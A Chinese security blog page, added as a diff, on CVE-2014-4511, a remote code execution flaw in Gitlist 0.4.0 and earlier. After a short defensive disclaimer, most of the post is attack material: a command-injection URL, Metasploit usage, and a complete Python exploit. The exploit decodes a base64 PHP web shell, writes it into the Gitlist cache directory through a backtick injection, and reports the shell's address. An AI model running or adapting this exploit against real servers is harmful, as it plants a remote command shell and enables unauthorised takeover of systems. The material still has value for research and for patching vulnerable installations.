@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>Gitlist代码版本控制脆弱性 | WeiyiGeek Blog&#39;s</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="Gitlist">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":"6537ff7a"}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.4.4"></script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">WeiyiGeek</h5>
+          <a href="mailto:master@weiyigeek.top" title="master@weiyigeek.top" class="mail">
+            
+              <span>m</span>
+            
+              <span>a</span>
+            
+              <span>s</span>
+            
+              <span>t</span>
+            
+              <span>e</span>
+            
+              <span>r</span>
+            
+              <span>@</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>i</span>
+            
+              <span>y</span>
+            
+              <span>i</span>
+            
+              <span>g</span>
+            
+              <span>e</span>
+            
+              <span>e</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>t</span>
+            
+              <span>o</span>
+            
+              <span>p</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/weiyigeek" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://weibo.com/615643678" target="_blank">
+                  <i class="icon icon-lg icon-weibo"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://t.me/WeiyiGeek" target="_blank">
+                  <i class="icon icon-lg icon-telegram"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                文章分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                文章标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/books"  >
+                <i class="icon icon-lg icon-book"></i>
+                学习书籍
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于作者
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                友情链接
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/weiyigeek" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://weibo.com/615643678" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Gitlist代码版本控制脆弱性</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Gitlist代码版本控制脆弱性</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-17T05:36:30.000Z" itemprop="datePublished" class="page-time">
+  2019-07-17
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-网安大类/Vulnerable/Appllication/版本控制/Gitlist代码版本控制脆弱性"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Gitlist代码版本控制脆弱性</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-17 13:36:30" datetime="2019-07-17T05:36:30.000Z"  itemprop="datePublished">2019-07-17</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><b style="color:red">注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击,请勿恶意使用下面描述技术进行非法操作。</b></p>
+<a id="more"></a>
+<h4 id="0x00-Gitlist-Revision-Control-Tools-在存在远程代码执行漏洞"><a href="#0x00-Gitlist-Revision-Control-Tools-在存在远程代码执行漏洞" class="headerlink" title="0x00 Gitlist (Revision Control Tools)在存在远程代码执行漏洞"></a>0x00 Gitlist (Revision Control Tools)在存在远程代码执行漏洞</h4><p>背景：在gitlist 0.4.0及之前版本存在远程代码执行漏洞，漏洞CVE版本号为CVE-2014-4511，该漏洞利用方式为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://test.com/test.git/master/<span class="string">""</span>`whoami`   <span class="comment">#，通过执行该命令可以导致gitlist出现未知错误</span></span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <a rel=Gitlist代码版本控制脆弱性 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190717162323.png" title="WeiyiGeek.示例" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190717162323.png" alt="WeiyiGeek.示例" title class></a>
+                <p>WeiyiGeek.示例</p>
+            </figure>
+<p>通过该利用程序可以将php木马写入到gitlist目录中，从而获取权限服务器：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf里面集成了gitlist_rce exploit：</span><br><span class="line">msf exploit &gt; use gitlist_rce</span><br><span class="line">msf exploit(gitlist_rce) &gt; rexploit</span><br></pre></td></tr></table></figure></p>
+<p>python版利用代码：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> commands <span class="keyword">import</span> getoutput</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Exploit Title: Gitlist &lt;= 0.4.0 anonymous RCE</span></span><br><span class="line"><span class="string">Date: 06/20/2014</span></span><br><span class="line"><span class="string">Author: drone (@dronesec)</span></span><br><span class="line"><span class="string">Vendor Homepage: http://gitlist.org/</span></span><br><span class="line"><span class="string">Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz</span></span><br><span class="line"><span class="string">Version: &lt;= 0.4.0</span></span><br><span class="line"><span class="string">Tested on: Debian 7</span></span><br><span class="line"><span class="string">More information: </span></span><br><span class="line"><span class="string">cve: CVE-2014-4511</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'%s: [url to git repo] &#123;cache path&#125;'</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'  Example: python %s http://localhost/gitlist/my_repo.git'</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache'</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = url <span class="keyword">if</span> url[<span class="number">-1</span>] != <span class="string">'/'</span> <span class="keyword">else</span> url[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/var/www/gitlist/cache"</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">    path = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] Using cache location %s'</span> % path</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload &lt;?system($_GET['cmd']);?&gt;</span></span><br><span class="line">payload = <span class="string">"PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sploit; python requests does not like this URL, hence wget is used</span></span><br><span class="line">mpath = <span class="string">'/blame/master/""`echo &#123;0&#125;|base64 -d &gt; &#123;1&#125;/x.php`'</span>.format(payload, path)</span><br><span class="line">mpath = url+ urllib.quote(mpath)</span><br><span class="line"></span><br><span class="line">out = getoutput(<span class="string">"wget %s"</span> % mpath)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'500'</span> <span class="keyword">in</span> out:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[!] Shell dropped; go hit %s/cache/x.php?cmd=ls'</span> % url.rsplit(<span class="string">'/'</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] Failed to drop'</span></span><br><span class="line">    <span class="keyword">print</span> out</span><br></pre></td></tr></table></figure></p>
+<p>执行效果:<br><figure class="image-box">
+                <a rel=Gitlist代码版本控制脆弱性 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190717162509.png" title="WeiyiGeek.利用方式" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190717162509.png" alt="WeiyiGeek.利用方式" title class></a>
+                <p>WeiyiGeek.利用方式</p>
+            </figure></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-03-22T05:21:23.725Z" itemprop="dateUpdated">2020-03-22 13:21:23</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/7/gitlist代码版本控制脆弱性.html" target="_blank" rel="external">http://weiyigeek.top/2019/7/gitlist代码版本控制脆弱性.html</a>
+        
+    </div>
+    <footer>
+        <a href="http://weiyigeek.top">
+            <img src="/img/avatar.png" alt="WeiyiGeek">
+            WeiyiGeek
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Gitlist/">Gitlist</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://weiyigeek.top/2019/7/gitlist代码版本控制脆弱性.html&title=《Gitlist代码版本控制脆弱性》 — WeiyiGeek Blog's&pic=http://weiyigeek.top/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://weiyigeek.top/2019/7/gitlist代码版本控制脆弱性.html&title=《Gitlist代码版本控制脆弱性》 — WeiyiGeek Blog's&source=注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击,请勿恶意使用下面描述技术进行非法操作。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/7/supra智能tv脆弱性.html" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">SUPRA智能TV脆弱性</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/7/nginx脆弱性利用一览.html" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Nginx脆弱性利用一览</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x00-Gitlist-Revision-Control-Tools-在存在远程代码执行漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 Gitlist (Revision Control Tools)在存在远程代码执行漏洞</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.weiyigeek.top" target="_blank">https://blog.weiyigeek.top</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                WeiyiGeek &copy; 2018 - 2020
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+      
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://weiyigeek.top/2019/7/gitlist代码版本控制脆弱性.html&title=《Gitlist代码版本控制脆弱性》 — WeiyiGeek Blog's&pic=http://weiyigeek.top/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://weiyigeek.top/2019/7/gitlist代码版本控制脆弱性.html&title=《Gitlist代码版本控制脆弱性》 — WeiyiGeek Blog's&source=注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击,请勿恶意使用下面描述技术进行非法操作。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuUlEQVR42u3a0WrrQAwE0P7/T7dwX4vTGcnr5MLxU0gTZ48LKzGrr6/4+v53/X7n6v2rz1z99fd98s/ccOHh4eGNln51XfGSRbxeXP4ryZ0vHwEeHh7eMd7rYpAAXpeQewtDsmY8PDy8T+Dlm/WsKU+2fjw8PLz/i9e2trM7zx43Hh4e3vO8ZCOehQt505ys6mDWgoeHh9ft1cUB2Ce8Pni+h4eHh7c4VZ9t67NIIh87KFaLh4eHd4CX/OT+KGvTFm8O3vDw8PDO8ZJQoO1X2852cwAWUfHw8PAe5M0GTPNxgf13o4YeDw8P7ybeJm5oN+jNcdosksDDw8M7wZuFAnkgO4seZuHvH1kLHh4e3q28NozIH0F+SJYfueUtOB4eHt45Xr7p54Uhj4DbBroexsLDw8M7xmtLRTtesGma8xJ1mU/j4eHh3cS7a1xgc8SVt9r1r+Dh4eEd4+U3agOFJwvMHxUPDw8P7xgvz33zmLU9TpvFu3h4eHjP8F5v6LMj/9kgwj4cuXwHDw8P71ZevckGj6MdOEgKw+zwDA8PD+80r/ja4oCqPWBrHwQeHh7eM7w8VmjDgryNzkOK/B+Ah4eHd47Xbrib13ngO1vDZRiBh4eH9whvM4yVLKstCXXxwMPDw3sTb9YEb2LZNrAoen88PDy8W3ntl5MAYlZUZneoRwfw8PDwRrw8ik1u3Q5vJSWqjZXx8PDwTvP2YUH+aGaDCAkVDw8P71285MojiTaoTd5pHyIeHh7eCd5m0CqPJ/JANm+1NzEKHh4e3p6XN8eb+HUzHNAWhignxsPDw1vzZhFtO3zQRr15GHH5z8DDw8N7Ky8PEfIAoi1R9YgYHh4e3gfwZuHFDVt8/OhXhQEPDw8v5rWjV7MjqHaca9a+4+Hh4Z3mbTb6pEWelYq8cZ+VLjw8PLwR7weRCbGGjOeMaQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    <script type="text/javascript" src="/js/clicklove.js"></script>
+<script src="//code.tidio.co/mpu0bwolvjiokdywpzqyjgqfordnx7ee.js" async></script>
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = 'WeiyiGeek Blog's-关注于网络安全_物联网安全开发_网络运维-分享学习笔记与心得';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+    <script type="text/javascript">
+  daovoice('init', {
+    app_id: "6537ff7a"
+  });
+  daovoice('update');
+</script>
+
+
+    
+</body>
+</html>
